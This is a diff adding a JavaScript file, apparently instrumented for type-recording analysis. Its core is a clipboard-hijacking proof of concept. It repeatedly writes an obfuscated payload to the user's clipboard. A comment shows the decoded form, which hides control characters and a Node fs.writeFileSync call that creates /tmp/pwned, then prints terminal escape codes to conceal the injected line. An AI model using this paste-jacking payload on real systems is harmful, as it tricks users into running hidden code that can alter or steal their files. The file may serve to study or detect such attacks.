@@ -1,0 +1,108 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+try { if (Inst0 <= 1000 && typeof (writeClipboardText) != "undefined") {_RecordType("<17,35,2>",(writeClipboardText)); Inst0++; } } catch(e) {}
+async function writeClipboardText(text) {
+try { if (Inst1 <= 1000 && typeof (text) != "undefined") {_RecordType("<36,40,2>",(text)); Inst1++; } } catch(e) {}
+try { if (Inst6 <= 1000 && typeof (error) != "undefined") {_RecordType("<113,118,5>",(error)); Inst6++; } } catch(e) {}
+  try {
+try { if (Inst2 <= 1000 && typeof (navigator.clipboard.writeText) != "undefined") {_RecordType("<64,93,4>",(navigator.clipboard.writeText)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (navigator.clipboard) != "undefined") {_RecordType("<64,83,4>",(navigator.clipboard)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (navigator) != "undefined") {_RecordType("<64,73,4>",(navigator)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (text) != "undefined") {_RecordType("<94,98,4>",(text)); Inst5++; } } catch(e) {}
+    await navigator.clipboard.writeText(text);
+  } catch (error) {
+try { if (Inst7 <= 1000 && typeof (console.error) != "undefined") {_RecordType("<127,140,6>",(console.error)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (console) != "undefined") {_RecordType("<127,134,6>",(console)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (error.message) != "undefined") {_RecordType("<141,154,6>",(error.message)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (error) != "undefined") {_RecordType("<141,146,6>",(error)); Inst10++; } } catch(e) {}
+    console.error(error.message);
+  }
+}
+payload="\x05\x15\x05a\x01'\x05s\x01,\x05d\x01'\x05f\x01d\x05'\x01e\x05)\x01n\x05;\x01w\x05p\x01p\x05r\x01/\x05i\x01p\x05n\x01m\x05t\x01t\x05(\x01/\x05'\x01'\x05\\\x01(\x05x\x01c\x051\x01n\x05b\x01y\x05[\x01S\x05A\x01e\x05\\\x01l\x05x\x01i\x051\x01F\x05b\x01e\x05[\x01t\x05J\x01i\x05\\\x01r\x05x\x01w\x051\x01.\x05b\x01s\x05[\x01f\x052\x01/\x05T\x01*\x05'\x01*\x05)\x01/\n\x19"
+try { if (Inst11 <= 1000 && typeof (payload) != "undefined") {_RecordType("<166,173,9>",(payload)); Inst11++; } } catch(e) {}
+//non obfuscated version:
+//payload="\x05\x15/**/fs.writeFileSync('/tmp/pwned','asdf');print('\\x1b[A\\x1b[J\\x1b[2T')\n\x19"
+
+try { if (Inst12 <= 1000 && typeof (fff) != "undefined") {_RecordType("<684,687,13>",(fff)); Inst12++; } } catch(e) {}
+function fff() {
+try { if (Inst13 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<695,705,14>",(setTimeout)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (x) != "undefined") {_RecordType("<706,707,14>",(x)); Inst14++; } } catch(e) {}
+  setTimeout(x => {
+try { if (Inst15 <= 1000 && typeof (writeClipboardText(payload).then) != "undefined") {_RecordType("<718,750,15>",(writeClipboardText(payload).then)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (writeClipboardText) != "undefined") {_RecordType("<718,736,15>",(writeClipboardText)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (payload) != "undefined") {_RecordType("<737,744,15>",(payload)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (x) != "undefined") {_RecordType("<751,752,15>",(x)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<756,767,15>",(console.log)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (console) != "undefined") {_RecordType("<756,763,15>",(console)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (x) != "undefined") {_RecordType("<768,769,15>",(x)); Inst21++; } } catch(e) {}
+    writeClipboardText(payload).then(x => console.log(x));
+try { if (Inst22 <= 1000 && typeof (fff) != "undefined") {_RecordType("<778,781,16>",(fff)); Inst22++; } } catch(e) {}
+    fff();
+  }, 1000);
+}
+try { if (Inst23 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<802,812,19>",(setTimeout)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (x) != "undefined") {_RecordType("<813,814,19>",(x)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (fff) != "undefined") {_RecordType("<818,821,19>",(fff)); Inst25++; } } catch(e) {}
+setTimeout(x => fff(), 100);
+
